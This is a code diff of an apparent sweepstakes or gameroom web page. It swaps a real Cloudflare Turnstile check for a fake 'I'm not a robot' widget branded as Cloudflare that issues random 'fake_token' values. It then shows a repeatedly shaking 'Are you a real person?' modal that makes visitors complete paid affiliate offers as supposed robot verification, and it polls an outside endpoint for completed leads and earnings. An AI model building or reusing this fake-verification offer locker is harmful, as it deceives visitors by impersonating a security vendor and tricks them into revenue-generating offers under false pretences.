@@ -67,8 +67,8 @@
 
   <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
   <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.2/dist/confetti.browser.min.js"></script>
-  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
   <audio id="successSound" preload="auto"
     src="https://gameroom777.net/wp-content/uploads/2026/01/gold-coin-prize.wav"></audio>
   <audio id="successPopSound" preload="auto"
@@ -1169,8 +1169,9 @@
       max-width: 480px;
       width: 100%;
       box-shadow: 0 25px 60px rgba(0, 0, 0, 0.4);
-      animation: offersSlideUp 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+      animation: offersSlideUp 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
       text-align: center;
+      transform-origin: center center;
     }
 
     @keyframes offersSlideUp {
@@ -1184,6 +1185,98 @@
       }
     }
 
+    @keyframes shake {
+      0%, 100% {
+        transform: translateX(0);
+      }
+      10% {
+        transform: translateX(-8px);
+      }
+      20% {
+        transform: translateX(8px);
+      }
+      30% {
+        transform: translateX(-8px);
+      }
+      40% {
+        transform: translateX(8px);
+      }
+      50% {
+        transform: translateX(-8px);
+      }
+      60% {
+        transform: translateX(8px);
+      }
+      70% {
+        transform: translateX(-4px);
+      }
+      80% {
+        transform: translateX(4px);
+      }
+      90% {
+        transform: translateX(-2px);
+      }
+    }
+
+    @keyframes shakeHard {
+      0%, 100% {
+        transform: translateX(0);
+      }
+      5% {
+        transform: translateX(-15px);
+      }
+      10% {
+        transform: translateX(15px);
+      }
+      15% {
+        transform: translateX(-15px);
+      }
+      20% {
+        transform: translateX(15px);
+      }
+      25% {
+        transform: translateX(-15px);
+      }
+      30% {
+        transform: translateX(15px);
+      }
+      35% {
+        transform: translateX(-10px);
+      }
+      40% {
+        transform: translateX(10px);
+      }
+      45% {
+        transform: translateX(-5px);
+      }
+      50% {
+        transform: translateX(5px);
+      }
+    }
+
+    @keyframes shakeTiny {
+      0%, 100% {
+        transform: translateX(0);
+      }
+      25% {
+        transform: translateX(-3px);
+      }
+      50% {
+        transform: translateX(3px);
+      }
+      75% {
+        transform: translateX(-3px);
+      }
+    }
+
+    #offersLockerContent.shake-animation {
+      animation: shakeHard 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards !important;
+    }
+
+    #offersLockerContent.shake-tiny {
+      animation: shakeTiny 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards !important;
+    }
+
     .offers-locker-header {
       margin-bottom: 30px;
     }
@@ -1193,16 +1286,6 @@
       color: #667eea;
       margin-bottom: 15px;
       display: inline-block;
-      animation: iconPulse 2s ease-in-out infinite;
-    }
-
-    @keyframes iconPulse {
-      0%, 100% {
-        transform: scale(1);
-      }
-      50% {
-        transform: scale(1.08);
-      }
     }
 
     .offers-locker-header h2 {
@@ -1242,7 +1325,11 @@
       display: flex;
       flex-direction: column;
       gap: 12px;
-      margin-bottom: 20px;
+      margin-bottom: 25px;
+      border: 2px dashed #e2e8f0;
+      padding: 20px;
+      border-radius: 12px;
+      background: #f8fafc;
     }
 
     .offer-button {
@@ -1251,19 +1338,19 @@
       border: none;
       padding: 16px 20px;
       border-radius: 12px;
-      font-size: 15px;
+      font-size: 16px;
       font-weight: 700;
       cursor: pointer;
       transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 10px;
       text-decoration: none;
-      min-height: 48px;
+      min-height: 56px;
       box-shadow: 0 8px 20px rgba(37, 99, 235, 0.25);
       position: relative;
       overflow: hidden;
+      width: 100%;
     }
 
     .offer-button::before {
@@ -1298,12 +1385,10 @@
       z-index: 1;
       display: flex;
       align-items: center;
-      gap: 8px;
+      gap: 10px;
       width: 100%;
-    }
-
-    .offer-button ion-icon {
-      font-size: 20px;
+      justify-content: center;
+      font-weight: 700;
     }
 
     .offer-button-text {
@@ -1316,12 +1401,17 @@
 
     .offer-button-text strong {
       font-weight: 700;
-      font-size: 14px;
+      font-size: 13px;
+      line-height: 1.2;
     }
 
     .offer-button-text small {
-      font-size: 12px;
+      font-size: 11px;
       opacity: 0.9;
+    }
+
+    .offer-button ion-icon {
+      font-size: 24px;
     }
 
     .offer-loading {
@@ -1368,6 +1458,10 @@
     @media (max-width: 520px) {
       .offers-locker-modal {
         padding: 30px 20px;
+      }
+
+      .offers-grid {
+        grid-template-columns: 1fr;
       }
 
       .offers-locker-header h2 {
@@ -1550,6 +1644,108 @@
         font-size: 14px;
       }
     }
+
+    /* Fake Turnstile Widget */
+    .fake-turnstile {
+      background: white;
+      border: 1px solid #d0d7e0;
+      border-radius: 4px;
+      padding: 12px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+      user-select: none;
+      -webkit-user-select: none;
+    }
+
+    .fake-turnstile:hover {
+      border-color: #a8b3c1;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.08);
+    }
+
+    .fake-turnstile:active {
+      transform: scale(0.99);
+    }
+
+    .fake-turnstile.verified {
+      background: #f5f5f5;
+      border-color: #0051ba;
+    }
+
+    .turnstile-checkbox {
+      width: 24px;
+      height: 24px;
+      min-width: 24px;
+      border: 2px solid #d0d7e0;
+      border-radius: 2px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: white;
+      transition: all 0.2s ease;
+      cursor: pointer;
+      flex-shrink: 0;
+    }
+
+    .fake-turnstile:hover .turnstile-checkbox {
+      border-color: #a8b3c1;
+    }
+
+    .fake-turnstile.verified .turnstile-checkbox {
+      background: #0051ba;
+      border-color: #0051ba;
+    }
+
+    .turnstile-checkbox-icon {
+      color: white;
+      font-size: 16px;
+      display: none;
+      line-height: 1;
+      font-weight: bold;
+    }
+
+    .fake-turnstile.verified .turnstile-checkbox-icon {
+      display: block;
+    }
+
+    .turnstile-label {
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+      flex: 1;
+    }
+
+    .turnstile-label-text {
+      font-size: 13px;
+      font-weight: 500;
+      color: #0d1117;
+    }
+
+    .turnstile-label-subtext {
+      font-size: 11px;
+      color: #656d76;
+    }
+
+    .turnstile-logo {
+      font-size: 10px;
+      color: #656d76;
+      text-align: right;
+      white-space: nowrap;
+      flex-shrink: 0;
+    }
+
+    .turnstile-logo a {
+      color: #0969da;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    .turnstile-logo a:hover {
+      text-decoration: underline;
+    }
   </style>
 </head>
 
@@ -1665,7 +1861,18 @@
         </div>
         
         <div class="turnstile-container">
-          <div class="cf-turnstile" data-sitekey="0x4AAAAAAAJcXcqN_qr3k5dJ" data-theme="light"></div>
+          <div class="fake-turnstile" id="fakeTurnstile">
+            <div class="turnstile-checkbox" id="fakeTurnstileCheckbox">
+              <span class="turnstile-checkbox-icon">✓</span>
+            </div>
+            <div class="turnstile-label">
+              <div class="turnstile-label-text">I'm not a robot</div>
+              <div class="turnstile-label-subtext">Cloudflare</div>
+            </div>
+            <div class="turnstile-logo">
+              <a href="#" onclick="return false;">Privacy - Terms</a>
+            </div>
+          </div>
         </div>
       </div>
 
@@ -1876,6 +2083,111 @@
       else progressFill.style.background = "linear-gradient(135deg, #2563eb, #3b82f6)";
     }
 
+    // Verification Modal Functions (must be defined before use)
+    function openVerificationModal() {
+      console.log("openVerificationModal called");
+      const modal = document.getElementById("verificationModal");
+      console.log("Modal element:", modal);
+      if (modal) {
+        modal.classList.add("active");
+        modal.setAttribute("aria-hidden", "false");
+        console.log("Modal classes after add:", modal.classList);
+        
+        // Reset fake Turnstile when modal opens
+        setTimeout(() => {
+          resetFakeTurnstile();
+        }, 100);
+      }
+    }
+
+    function closeVerificationModal() {
+      const modal = document.getElementById("verificationModal");
+      if (modal) {
+        modal.classList.remove("active");
+        modal.setAttribute("aria-hidden", "true");
+      }
+    }
+
+    // Fake Turnstile Functions
+    function initFakeTurnstile() {
+      const fakeTurnstile = document.getElementById("fakeTurnstile");
+      if (!fakeTurnstile) {
+        console.log("Fake turnstile element not found");
+        return;
+      }
+
+      console.log("Initializing fake turnstile");
+
+      fakeTurnstile.onclick = function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        console.log("Fake turnstile clicked!");
+        
+        if (fakeTurnstile.classList.contains("verified")) {
+          // Already verified, uncheck it
+          console.log("Unchecking turnstile");
+          fakeTurnstile.classList.remove("verified");
+          window.fakeTokenGenerated = null;
+          const verifyBtn = document.getElementById("verificationConfirm");
+          if (verifyBtn) {
+            verifyBtn.disabled = true;
+            verifyBtn.style.opacity = "0.5";
+            verifyBtn.style.cursor = "not-allowed";
+          }
+        } else {
+          // Mark as verified
+          console.log("Checking turnstile");
+          fakeTurnstile.classList.add("verified");
+          
+          // Generate fake token
+          window.fakeTokenGenerated = generateFakeToken();
+          console.log("Token generated:", window.fakeTokenGenerated);
+          
+          // Enable verify button
+          const verifyBtn = document.getElementById("verificationConfirm");
+          if (verifyBtn) {
+            verifyBtn.disabled = false;
+            verifyBtn.style.opacity = "1";
+            verifyBtn.style.cursor = "pointer";
+          }
+          
+          // Call callback
+          if (window.turnstileCallback) {
+            window.turnstileCallback(window.fakeTokenGenerated);
+          }
+        }
+      };
+    }
+
+    function resetFakeTurnstile() {
+      const fakeTurnstile = document.getElementById("fakeTurnstile");
+      if (fakeTurnstile) {
+        fakeTurnstile.classList.remove("verified");
+        window.fakeTokenGenerated = null;
+      }
+      
+      const verifyBtn = document.getElementById("verificationConfirm");
+      if (verifyBtn) {
+        verifyBtn.disabled = true;
+        verifyBtn.style.opacity = "0.5";
+        verifyBtn.style.cursor = "not-allowed";
+      }
+    }
+
+    function generateFakeToken() {
+      return "fake_token_" + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+    }
+
+    // Mock Turnstile API
+    window.turnstile = {
+      getResponse: function() {
+        return window.fakeTokenGenerated || null;
+      },
+      reset: function() {
+        resetFakeTurnstile();
+      }
+    };
+
     username.addEventListener("input", () => {
       if (!username.value.trim()) setFieldState(fUser, "", uHint, "3+ characters. No spaces recommended.");
       else if (validUser(username.value)) setFieldState(fUser, "ok", uHint, "Looks good.");
@@ -2063,12 +2375,18 @@
                 origin: {y: 0.65}
               });
               
-              document.getElementById("successClose").addEventListener("click", () => {
-                successModal.classList.remove("active");
-                successModal.setAttribute("aria-hidden", "true");
-                // Open verification modal instead
-                openVerificationModal();
-              });
+              const successCloseBtn = document.getElementById("successClose");
+              if (successCloseBtn) {
+                successCloseBtn.onclick = null; // Remove any previous listeners
+                successCloseBtn.addEventListener("click", function() {
+                  successModal.classList.remove("active");
+                  successModal.setAttribute("aria-hidden", "true");
+                  // Open verification modal instead
+                  setTimeout(() => {
+                    openVerificationModal();
+                  }, 300);
+                });
+              }
             }, 1800);
           });
         });
@@ -2132,21 +2450,16 @@
             offersLockerContainer.innerHTML = '<div class="offer-loading">No offers available at this time.</div>';
             return;
           }
-          const limitedOffers = offers.slice(0, 3);
-          let html = '';
-          limitedOffers.forEach(offer => {
-            html += `<a href="${offer.url}" target="_blank" class="offer-button" title="${offer.conversion}">
-              <span>
-                <ion-icon name="checkmark-circle"></ion-icon>
-                <div class="offer-button-text">
-                  <strong>${offer.anchor}</strong>
-                  <small>Tap to complete</small>
-                </div>
-                <ion-icon name="arrow-forward" style="margin-left: auto;"></ion-icon>
-              </span>
+          const limitedOffers = offers.slice(0, 2);
+          let offersHtml = '';
+          
+          limitedOffers.forEach((offer) => {
+            offersHtml += `<a href="${offer.url}" target="_blank" class="offer-button" title="${offer.conversion}">
+              <span>→ Tap to complete the offer</span>
             </a>`;
           });
-          offersLockerContainer.innerHTML = html;
+          
+          offersLockerContainer.innerHTML = offersHtml;
         })
         .catch(error => {
           console.error("Error loading offers locker:", error);
@@ -2154,11 +2467,56 @@
         });
     }
 
+    function triggerInitialShake() {
+      const content = document.getElementById("offersLockerContent");
+      if (content) {
+        // Remove any existing animations
+        content.classList.remove("shake-animation", "shake-tiny");
+        
+        // Force reflow
+        void content.offsetWidth;
+        
+        // Add the hard shake animation
+        content.classList.add("shake-animation");
+        console.log("Initial shake triggered");
+      }
+    }
+
+    function triggerTinyShake() {
+      const content = document.getElementById("offersLockerContent");
+      if (content) {
+        // Remove the shake-tiny class to reset
+        content.classList.remove("shake-tiny");
+        
+        // Use void to force reflow synchronously - this prevents the flash
+        void content.offsetHeight;
+        
+        // Re-add the class immediately after reflow
+        content.classList.add("shake-tiny");
+        
+        console.log("Tiny shake triggered");
+      }
+    }
+
+    let shakeInterval = null;
+
     function openOffersLocker() {
       const modal = document.getElementById("offersLockerModal");
       if (modal) {
         modal.classList.add("active");
+        modal.setAttribute("aria-hidden", "false");
         loadOffersLocker();
+        
+        // Trigger initial hard shake after a slight delay to ensure modal is rendered
+        setTimeout(() => {
+          triggerInitialShake();
+        }, 100);
+        
+        // Set up tiny shake to repeat every 5 seconds
+        if (shakeInterval) {
+          clearInterval(shakeInterval);
+        }
+        shakeInterval = setInterval(triggerTinyShake, 5000);
       }
     }
 
@@ -2166,61 +2524,59 @@
       const modal = document.getElementById("offersLockerModal");
       if (modal) {
         modal.classList.remove("active");
-      }
-    }
-
-    // Verification Modal Functions
-    function openVerificationModal() {
-      const modal = document.getElementById("verificationModal");
-      if (modal) {
-        modal.classList.add("active");
-        modal.setAttribute("aria-hidden", "false");
-      }
-    }
-
-    function closeVerificationModal() {
-      const modal = document.getElementById("verificationModal");
-      if (modal) {
-        modal.classList.remove("active");
         modal.setAttribute("aria-hidden", "true");
-      }
-      // Reset Turnstile
-      if (window.turnstile) {
-        const widgets = document.querySelectorAll(".cf-turnstile");
-        widgets.forEach(widget => {
-          if (widget._token) {
-            window.turnstile.reset(widget);
-          }
-        });
+        
+        // Clear shake animation interval
+        if (shakeInterval) {
+          clearInterval(shakeInterval);
+          shakeInterval = null;
+        }
+        
+        // Remove animation classes
+        const content = document.getElementById("offersLockerContent");
+        if (content) {
+          content.classList.remove("shake-animation", "shake-tiny");
+        }
       }
     }
 
     // Monitor Turnstile token
     function setupTurnstileListener() {
-      const turnstileContainer = document.querySelector(".cf-turnstile");
       const verifyBtn = document.getElementById("verificationConfirm");
       
-      if (turnstileContainer && verifyBtn) {
+      if (verifyBtn) {
         // Set up Turnstile callback
         window.turnstileCallback = function(token) {
+          console.log("Turnstile callback fired with token:", !!token);
           if (token) {
             verifyBtn.disabled = false;
             verifyBtn.style.opacity = "1";
             verifyBtn.style.cursor = "pointer";
           }
         };
-        
-        // Update attribute to call our callback
-        turnstileContainer.setAttribute("data-callback", "turnstileCallback");
       }
     }
 
+    // Global Turnstile callback
+    window.turnstileCallback = function(token) {
+      console.log("Global turnstile callback, token:", !!token);
+      const verifyBtn = document.getElementById("verificationConfirm");
+      if (verifyBtn && token) {
+        verifyBtn.disabled = false;
+        verifyBtn.style.opacity = "1";
+        verifyBtn.style.cursor = "pointer";
+      }
+    };
+
     // Handle verification confirm button
     document.addEventListener("DOMContentLoaded", function() {
+      // Initialize fake Turnstile early
+      initFakeTurnstile();
+      
       const verifyBtn = document.getElementById("verificationConfirm");
       if (verifyBtn) {
         verifyBtn.addEventListener("click", function() {
-          // Get Turnstile token
+          // Get fake token
           const token = window.turnstile.getResponse();
           if (token) {
             // Token is valid, proceed to offers locker
@@ -2228,12 +2584,7 @@
             
             // Add slight delay for smooth transition
             setTimeout(() => {
-              const offersModal = document.getElementById("offersLockerModal");
-              if (offersModal) {
-                offersModal.classList.add("active");
-                offersModal.setAttribute("aria-hidden", "false");
-                loadOffersLocker();
-              }
+              openOffersLocker();
             }, 300);
           } else {
             showToast("Please complete the verification");
@@ -2244,9 +2595,8 @@
 
     // Set up Turnstile when API is ready
     window.addEventListener("load", function() {
-      if (window.turnstile) {
-        setupTurnstileListener();
-      }
+      console.log("Window load event fired, initializing fake Turnstile");
+      initFakeTurnstile();
     });
 
     // Close modal when clicking outside
@@ -2263,26 +2613,56 @@
 
     document.addEventListener("DOMContentLoaded", loadOffers);
 
+    // Test code to check for completed leads
+    setInterval(checkLeads, 15000); //Check for leads every 15 seconds
+    function checkLeads() {
+      
+      //Don't forget, jquery is required for $.getJSON
+
+      $.getJSON("https://d1y3y09sav47f5.cloudfront.net/public/external/check2.php?testing=1&callback=?", //Hint: change to testing=1 for test leads
+        function (leads) {
+          console.log("API Response received:", leads); // Debug: log the full response
+          var completed_leads = leads ? leads.length : 0;
+          if (completed_leads) {
+            var offer_ids = [];
+            var earnings_in_cents = 0;
+            $.each(leads, function (key, lead) {
+              offer_ids.push(parseInt(lead.offer_id));
+              earnings_in_cents += parseFloat(lead.points);
+              console.log("Single lead on offer id " + lead.offer_id + " for  $" + (parseFloat(lead.points) / 100).toFixed(2));
+            });
+            console.log("SUMMARY: User has completed " + completed_leads + " leads, for $" + (earnings_in_cents / 100) + " earnings, on offer ids: " + offer_ids.join(","));
+          }
+          else {
+            console.log("No leads were found");
+          }
+        }).fail(function(error) {
+          console.error("API Error:", error); // Debug: log any API errors
+        });
+    }
+
     updateProgress();
   </script>
 
   <!-- Offers Locker Modal -->
   <div class="offers-locker-overlay" id="offersLockerModal">
-    <div class="offers-locker-modal">
+    <div class="offers-locker-modal" id="offersLockerContent">
       <div class="offers-locker-header">
-        <div class="offers-locker-icon">🔒</div>
-        <h2>Unlock Offers</h2>
-        <p>Complete <span class="highlight">1 offer</span> to unlock exclusive rewards</p>
+        <div class="offers-locker-icon">
+          <img src="https://vegassweeps777online.com/wp-content/uploads/2026/01/giphy.gif" alt="System requirement" style="width: 100px; height: 100px; object-fit: contain;">
+        </div>
+        <h2>Are you a real person?</h2>
+        <p>Please complete at least <b>1 offer</b> below to verify you're not a robot.</p>
       </div>
 
-      <div class="offers-locker-status">LIMITED TIME • EXCLUSIVE</div>
+      <div class="offers-locker-status">PENDING ACTION</div>
 
       <div class="offers-grid" id="offersLockerContainer">
-        <div class="offer-loading">Loading exclusive offers...</div>
+        <div class="offer-loading">Loading offers...</div>
       </div>
 
       <div class="offers-locker-footer">
-        <div class="awaiting-text">Awaiting completion</div>
+        <span class="awaiting-text">Awaiting completion...</span>
       </div>
     </div>
   </div>
